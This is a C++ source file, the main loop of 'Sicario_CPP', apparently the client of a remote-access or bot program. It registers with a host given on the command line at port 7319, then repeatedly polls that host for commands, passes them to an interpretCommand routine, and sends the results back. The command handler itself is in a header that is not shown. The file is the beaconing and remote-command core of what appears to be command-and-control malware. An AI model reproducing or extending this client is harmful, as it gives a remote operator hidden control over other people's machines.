#include <iostream>
#include <string>
#include <stdlib.h>

#ifdef __unix__
    #include <unistd.h>
#endif

#include "sicarioClient.h"


// Warning: Platform-specific!
void sleepFor(unsigned long long seconds) {
    sleep(seconds);
}

const std::string msg_copyright = "Sicario_CPP // 2018 // Made by Erusima and Dante383\n\n";

int main(int argc, char** argv) {
    std::cout << msg_copyright;
    SicarioClient client(argv[1], 7319);
    std::cout << client.registerUser();
    client.disconnect();
    while(true) {
        client.reconnect();
        std::string data = client.receiveData(); // DEBUG
        std::cout << data;
        if(data != "") {
            std::string result = client.interpretCommand(data);
            client.sendData(result);
        }
        client.disconnect();
        sleepFor(client.connInterval);
    }
}

